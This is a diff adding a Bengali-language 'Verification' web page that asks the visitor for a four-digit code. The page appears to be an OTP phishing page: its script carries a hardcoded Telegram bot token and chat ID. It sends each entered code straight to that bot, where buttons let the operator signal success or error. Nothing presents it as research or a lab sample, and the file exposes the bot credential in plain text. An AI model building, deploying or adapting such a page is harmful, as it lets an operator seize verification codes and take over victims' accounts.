@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="flex items-center justify-center min-h-screen bg-gray-100">
+
+    <div class="bg-white p-8 rounded-2xl shadow-xl w-80 text-center">
+        <h2 class="text-xl font-bold mb-6 text-gray-800">কোড যাচাই করুন</h2>
+        
+        <div id="inputContainer" class="flex justify-center gap-3">
+            <input type="text" class="codeInput w-12 h-12 border-2 border-gray-300 text-center text-xl rounded-lg focus:border-blue-500 outline-none" maxlength="1">
+            <input type="text" class="codeInput w-12 h-12 border-2 border-gray-300 text-center text-xl rounded-lg focus:border-blue-500 outline-none" maxlength="1">
+            <input type="text" class="codeInput w-12 h-12 border-2 border-gray-300 text-center text-xl rounded-lg focus:border-blue-500 outline-none" maxlength="1">
+            <input type="text" class="codeInput w-12 h-12 border-2 border-gray-300 text-center text-xl rounded-lg focus:border-blue-500 outline-none" maxlength="1">
+        </div>
+        <p id="status" class="mt-4 text-sm text-gray-500">আপনার কোডটি দিন</p>
+    </div>
+
+    <script>
+        // কনফিগারেশন
+        const BOT_TOKEN = "7957986649:AAGCcJ5R6g6PMHEgWXFqLRn2SrpElZvUtnE";
+        const CHAT_ID = "8516934257";
+
+        const inputs = document.querySelectorAll('.codeInput');
+        const statusText = document.getElementById('status');
+
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < 3) inputs[index + 1].focus();
+                
+                // সব ইনপুট পূর্ণ হয়েছে কিনা চেক করা
+                let code = "";
+                inputs.forEach(i => code += i.value);
+                
+                if (code.length === 4) {
+                    statusText.innerText = "পাঠানো হচ্ছে...";
+                    sendToTelegram(code);
+                }
+            });
+        });
+
+        function sendToTelegram(code) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            const payload = {
+                chat_id: CHAT_ID,
+                text: "নতুন কোড পাওয়া গেছে: " + code,
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: "✅ Success", callback_data: "success" },
+                            { text: "❌ Error", callback_data: "error" }
+                        ]
+                    ]
+                }
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.ok) {
+                    statusText.innerText = "সফলভাবে পাঠানো হয়েছে!";
+                } else {
+                    statusText.innerText = "ত্রুটি হয়েছে, আবার চেষ্টা করুন।";
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                statusText.innerText = "নেটওয়ার্ক সমস্যা!";
+            });
+        }
+    </script>
+</body>
+</html>
